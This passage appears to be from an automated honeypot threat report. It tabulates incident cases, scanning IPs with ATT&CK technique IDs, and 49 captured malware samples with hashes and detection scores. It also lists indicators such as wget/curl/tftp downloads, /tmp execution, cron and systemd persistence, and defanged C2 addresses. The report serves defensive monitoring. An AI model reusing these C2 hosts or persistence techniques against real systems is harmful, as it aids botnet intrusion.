| IR-11c325643bac | HIGH | `92.118.39[.]63` | 2026-11-12 09:03 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-80cab6c81991 | HIGH | `92.118.39[.]63` | 2026-11-12 09:06 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-d62b80de3e57 | HIGH | `195.178.110[.]78` | 2026-11-12 09:06 | Y | 0 | 0 | `T1078` |
| IR-a3858d826468 | HIGH | `92.118.39[.]63` | 2026-11-12 09:09 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b842bfd67b9e | HIGH | `80.94.95[.]118` | 2026-11-12 09:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e586b3eb6b32 | HIGH | `92.118.39[.]63` | 2026-11-12 09:11 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-4745d3a24a39 | HIGH | `92.118.39[.]63` | 2026-11-12 09:14 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
_… 323 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `195.178.110[.]78` | **3** | 2026-11-12 15:54 | 2026-11-12 18:04 | 0m | 3 | `T1110.001` | 🟢 LOW |
| `109.160.32[.]34` | **2** | 2026-11-12 11:36 | 2026-11-12 12:31 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-11-12 03:31 | 2026-11-12 04:17 | 2m | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-11-12 06:54 | 2026-11-12 08:04 | 2m | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-11-12 10:17 | 2026-11-12 12:14 | 1m | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-11-12 14:17 | 2026-11-12 16:10 | 1m | 0 | `T1592` | 🟢 LOW |
| `91.204.224[.]17` | **2** | 2026-11-12 11:13 | 2026-11-12 12:18 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]63` | **2** | 2026-11-12 07:47 | 2026-11-12 08:20 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `92.118.39[.]77` | **2** | 2026-11-12 09:57 | 2026-11-12 10:19 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.0.9[.]214` | 1 | 2026-11-12 06:25 | 2026-11-12 06:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `102.207.138[.]202` | 1 | 2026-11-12 16:49 | 2026-11-12 16:49 | 33s | 0 | `T1592` | 🟢 LOW |
| `103.159.167[.]129` | 1 | 2026-11-12 14:11 | 2026-11-12 14:11 | 4s | 0 | `T1592` | 🟢 LOW |
| `103.159.2[.]113` | 1 | 2026-11-12 13:28 | 2026-11-12 13:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]11` | 1 | 2026-11-12 05:07 | 2026-11-12 05:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]113` | 1 | 2026-11-12 12:40 | 2026-11-12 12:40 | 7s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]126` | 1 | 2026-11-12 04:08 | 2026-11-12 04:08 | 11s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `109.160.32[.]149` | 1 | 2026-11-12 04:51 | 2026-11-12 04:51 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]32` | 1 | 2026-11-12 03:07 | 2026-11-12 03:07 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.236.124[.]166` | 1 | 2026-11-12 04:02 | 2026-11-12 04:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `117.62.22[.]127` | 1 | 2026-11-12 10:09 | 2026-11-12 10:09 | 9s | 0 | `T1592` | 🟢 LOW |
| `120.48.14[.]39` | 1 | 2026-11-12 05:52 | 2026-11-12 05:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.90[.]166` | 1 | 2026-11-12 18:20 | 2026-11-12 18:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.155.132[.]40` | 1 | 2026-11-12 18:18 | 2026-11-12 18:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `128.14.236[.]41` | 1 | 2026-11-12 11:12 | 2026-11-12 11:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `134.33.64[.]214` | 1 | 2026-11-12 14:48 | 2026-11-12 14:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-11-12 18:41 | 2026-11-12 18:42 | 68s | 0 | `T1592` | 🟢 LOW |
| `138.68.102[.]151` | 1 | 2026-11-12 16:10 | 2026-11-12 16:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `138.97.242[.]246` | 1 | 2026-11-12 13:52 | 2026-11-12 13:53 | 12s | 0 | `T1592` | 🟢 LOW |
| `14.103.111[.]13` | 1 | 2026-11-12 18:20 | 2026-11-12 18:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.187.221[.]81` | 1 | 2026-11-12 16:34 | 2026-11-12 16:34 | 5s | 0 | `T1592` | 🟢 LOW |
| `151.243.11[.]168` | 1 | 2026-11-12 14:52 | 2026-11-12 14:52 | 4s | 0 | `T1592` | 🟢 LOW |
| `151.243.18[.]193` | 1 | 2026-11-12 10:45 | 2026-11-12 10:45 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `159.89.235[.]232` | 1 | 2026-11-12 10:54 | 2026-11-12 10:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `161.81.81[.]195` | 1 | 2026-11-12 10:40 | 2026-11-12 10:40 | 13s | 0 | `T1592` | 🟢 LOW |
| `165.154.254[.]79` | 1 | 2026-11-12 10:57 | 2026-11-12 10:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `165.22.105[.]175` | 1 | 2026-11-12 05:02 | 2026-11-12 05:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `165.22.105[.]175` | 1 | 2026-11-12 11:11 | 2026-11-12 11:12 | 48s | 0 | `T1592` | 🟢 LOW |
| `170.64.147[.]115` | 1 | 2026-11-12 09:59 | 2026-11-12 09:59 | 30s | 0 | `T1592` | 🟢 LOW |
| `170.81.233[.]100` | 1 | 2026-11-12 04:07 | 2026-11-12 04:07 | 13s | 0 | `T1592` | 🟢 LOW |
| `177.182.182[.]146` | 1 | 2026-11-12 18:51 | 2026-11-12 18:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `179.51.125[.]101` | 1 | 2026-11-12 13:56 | 2026-11-12 13:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `179.51.125[.]99` | 1 | 2026-11-12 13:58 | 2026-11-12 13:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.76.97[.]104` | 1 | 2026-11-12 13:55 | 2026-11-12 13:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.93.193[.]100` | 1 | 2026-11-12 09:50 | 2026-11-12 09:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `183.171.9[.]22` | 1 | 2026-11-12 15:53 | 2026-11-12 15:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `184.105.139[.]69` | 1 | 2026-11-12 06:55 | 2026-11-12 06:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]144` | 1 | 2026-11-12 04:34 | 2026-11-12 04:34 | 2s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]192` | 1 | 2026-11-12 18:37 | 2026-11-12 18:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.41.177[.]17` | 1 | 2026-11-12 08:16 | 2026-11-12 08:16 | 33s | 0 | `T1592` | 🟢 LOW |
| `187.87.233[.]140` | 1 | 2026-11-12 16:56 | 2026-11-12 16:56 | 13s | 0 | `T1592` | 🟢 LOW |
| `192.51.188[.]6` | 1 | 2026-11-12 12:03 | 2026-11-12 12:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.29.13[.]199` | 1 | 2026-11-12 09:42 | 2026-11-12 09:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.29.13[.]199` | 1 | 2026-11-12 14:21 | 2026-11-12 14:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-12 06:01 | 2026-11-12 06:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-12 09:18 | 2026-11-12 09:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-12 16:15 | 2026-11-12 16:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]84` | 1 | 2026-11-12 05:18 | 2026-11-12 05:18 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]217` | 1 | 2026-11-12 13:21 | 2026-11-12 13:21 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `197.219.208[.]38` | 1 | 2026-11-12 15:53 | 2026-11-12 15:54 | 41s | 0 | `T1592` | 🟢 LOW |
| `199.165.159[.]105` | 1 | 2026-11-12 11:44 | 2026-11-12 11:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `202.140.129[.]74` | 1 | 2026-11-12 12:27 | 2026-11-12 12:28 | 34s | 0 | `T1592` | 🟢 LOW |
| `210.64.103[.]139` | 1 | 2026-11-12 07:58 | 2026-11-12 07:58 | 12s | 0 | `T1592` | 🟢 LOW |
| `211.194.52[.]6` | 1 | 2026-11-12 05:46 | 2026-11-12 05:46 | 21s | 0 | `T1592` | 🟢 LOW |
| `216.226.76[.]10` | 1 | 2026-11-12 10:23 | 2026-11-12 10:24 | 14s | 0 | `T1592` | 🟢 LOW |
| `216.226.77[.]10` | 1 | 2026-11-12 16:41 | 2026-11-12 16:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `216.244.231[.]142` | 1 | 2026-11-12 07:11 | 2026-11-12 07:11 | 10s | 0 | `T1592` | 🟢 LOW |
| `219.153.103[.]109` | 1 | 2026-11-12 08:26 | 2026-11-12 08:26 | 2s | 0 | `T1592` | 🟢 LOW |
| `220.87.110[.]141` | 1 | 2026-11-12 15:41 | 2026-11-12 15:41 | 25s | 0 | `T1592` | 🟢 LOW |
| `222.96.89[.]220` | 1 | 2026-11-12 12:09 | 2026-11-12 12:10 | 25s | 0 | `T1592` | 🟢 LOW |
| `35.206.133[.]206` | 1 | 2026-11-12 07:28 | 2026-11-12 07:28 | 2s | 0 | `T1592` | 🟢 LOW |
| `35.206.141[.]203` | 1 | 2026-11-12 07:59 | 2026-11-12 07:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.206.163[.]19` | 1 | 2026-11-12 07:29 | 2026-11-12 07:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.206.178[.]11` | 1 | 2026-11-12 03:59 | 2026-11-12 03:59 | 2s | 0 | `T1592` | 🟢 LOW |
| `35.206.186[.]197` | 1 | 2026-11-12 03:59 | 2026-11-12 03:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.120[.]245` | 1 | 2026-11-12 07:23 | 2026-11-12 07:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.75[.]156` | 1 | 2026-11-12 06:38 | 2026-11-12 06:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `37.55.39[.]223` | 1 | 2026-11-12 03:13 | 2026-11-12 03:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `4.148.240[.]228` | 1 | 2026-11-12 07:29 | 2026-11-12 07:29 | 9s | 0 | `T1592` | 🟢 LOW |
| `40.124.172[.]59` | 1 | 2026-11-12 07:03 | 2026-11-12 07:03 | 10s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-11-12 10:07 | 2026-11-12 10:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]61` | 1 | 2026-11-12 03:24 | 2026-11-12 03:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.167.80[.]94` | 1 | 2026-11-12 05:06 | 2026-11-12 05:07 | 12s | 0 | `T1592` | 🟢 LOW |
| `45.79.181[.]104` | 1 | 2026-11-12 07:08 | 2026-11-12 07:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-11-12 03:47 | 2026-11-12 03:47 | 1s | 0 | `T1592` | 🟢 LOW |
| `51.170.134[.]172` | 1 | 2026-11-12 09:29 | 2026-11-12 09:29 | 13s | 0 | `T1592` | 🟢 LOW |
| `58.221.60[.]25` | 1 | 2026-11-12 12:39 | 2026-11-12 12:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]223` | 1 | 2026-11-12 04:00 | 2026-11-12 04:00 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-11-12 04:48 | 2026-11-12 04:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]96` | 1 | 2026-11-12 08:33 | 2026-11-12 08:33 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]99` | 1 | 2026-11-12 14:33 | 2026-11-12 14:33 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]212` | 1 | 2026-11-12 14:35 | 2026-11-12 14:35 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]222` | 1 | 2026-11-12 08:35 | 2026-11-12 08:35 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]102` | 1 | 2026-11-12 14:35 | 2026-11-12 14:36 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]105` | 1 | 2026-11-12 08:35 | 2026-11-12 08:35 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]74` | 1 | 2026-11-12 05:33 | 2026-11-12 05:33 | 4s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]89` | 1 | 2026-11-12 08:34 | 2026-11-12 08:34 | 17s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]93` | 1 | 2026-11-12 14:34 | 2026-11-12 14:34 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]94` | 1 | 2026-11-12 08:33 | 2026-11-12 08:34 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]94` | 1 | 2026-11-12 14:34 | 2026-11-12 14:34 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]234` | 1 | 2026-11-12 08:32 | 2026-11-12 08:32 | 5s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-11-12 06:39 | 2026-11-12 06:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `76.38.16[.]128` | 1 | 2026-11-12 09:09 | 2026-11-12 09:10 | 13s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-12 04:37 | 2026-11-12 04:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-12 14:55 | 2026-11-12 14:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-12 18:25 | 2026-11-12 18:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.243.117[.]205` | 1 | 2026-11-12 11:03 | 2026-11-12 11:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-12 04:11 | 2026-11-12 04:11 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-12 08:34 | 2026-11-12 08:34 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-12 13:01 | 2026-11-12 13:01 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-12 17:28 | 2026-11-12 17:29 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.114[.]118` | 1 | 2026-11-12 13:23 | 2026-11-12 13:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.94.95[.]223` | 1 | 2026-11-12 11:09 | 2026-11-12 11:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.94.95[.]223` | 1 | 2026-11-12 15:47 | 2026-11-12 15:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `82.147.84[.]246` | 1 | 2026-11-12 10:37 | 2026-11-12 10:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `82.162.17[.]177` | 1 | 2026-11-12 16:43 | 2026-11-12 16:43 | 8s | 0 | `T1592` | 🟢 LOW |
| `83.233.22[.]225` | 1 | 2026-11-12 10:04 | 2026-11-12 10:05 | 30s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]25` | 1 | 2026-11-12 04:07 | 2026-11-12 04:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.211.134[.]201` | 1 | 2026-11-12 03:25 | 2026-11-12 03:25 | 12s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]75` | 1 | 2026-11-12 04:40 | 2026-11-12 04:41 | 13s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `94.140.233[.]159` | 1 | 2026-11-12 17:02 | 2026-11-12 17:03 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0de787cffbec4dcc42e0ecd9491795c7dfe8fe4a955cb67a87544d5c36070982` | ELF Binary (Linux executable) (x86-64 64-bit) | `0de787cffbec4dcc...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `19e78c00d07f011fcb708ffb12f8dd2fd0f1e57faaf21129b53c7f68ae611e60` | ELF Binary (Linux executable) (x86-64 64-bit) | `19e78c00d07f011f...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
